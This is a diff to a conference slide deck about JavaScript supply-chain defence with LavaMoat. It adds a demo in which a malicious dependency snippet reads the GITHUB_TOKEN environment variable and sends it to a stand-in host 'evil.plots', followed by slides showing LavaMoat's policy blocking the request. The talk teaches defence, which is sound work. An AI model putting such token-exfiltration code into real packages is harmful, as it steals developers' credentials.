@@ -237,17 +237,113 @@
         </blockquote>
 
       </section>
+
       <section data-markdown>
         <textarea data-template>
 ![lavamoat](./lavamoat-logo.png)
 
 #### Be proactive not reactive
 
+
+
+
+</textarea>
+</section>
+<section>
+  <section>
+    <h1> DEMO 🪄 </h1>
+
+  <br> <br> <br>
+          <a style="font-size: 0.6em" href="https://github.com/naugtur/i-run-code-from-the-internet">https://github.com/naugtur/i-run-code-from-the-internet</a>
+
+  </section>
+  <section data-markdown class="blackhat">
+    <textarea>
+#### oh, look, a package
+
+
+```
+const credentials = process.env["GITHUB_TOKEN"];
+
+const req = require('https').request({
+   hostname: 'evil.plots',
+   path: `/stolen/${credentials}`,
+ }, ()=>{});
+
+req.end();
+```
+      
+    </textarea>
+  </section>
+
+  <section data-markdown class="whitehat">
+    #### yo, there's an app for that!
+
+```
+package.json:
+"scripts": {
+  "generate-policy": "lavamoat build.js --auto",
+  "build": "lavamoat build.js",
+```
+
 ---
 
-# DEMO  🪄
+#### look what it found
+      
+```js
+./lavamoat/node/policy.json:
+"that-eslint-plugin>evil-dependency": {
+"builtin": {
+  "https.request": true
+},
+"globals": {
+  "process.env": true
+},
+
+```
 
 ---
+
+#### look what it found
+      
+```js
+./lavamoat/node/policy.json:
+"that-eslint-plugin>evil-dependency": {
+"builtin": {
+  "https": false
+},
+"globals": {
+  "process": false
+},
+
+```
+    
+---
+
+```
+$ npm run build
+
+Error: LavaMoat - required node builtin package not in 
+allowlist: package "evil-dependency" requested "https"
+
+TypeError: Cannot read properties of undefined 
+(reading 'env')
+```
+    </textarea>
+  </section>
+
+
+
+  <section data-markdown class="blackhat">
+    # (╯°□°)╯︵ ┻━┻
+
+    &nbsp;
+
+    # how ?!
+  </section>
+</section>
+      <section data-markdown>
+        <textarea data-template>
 
 ## Hardened Javascript 
   
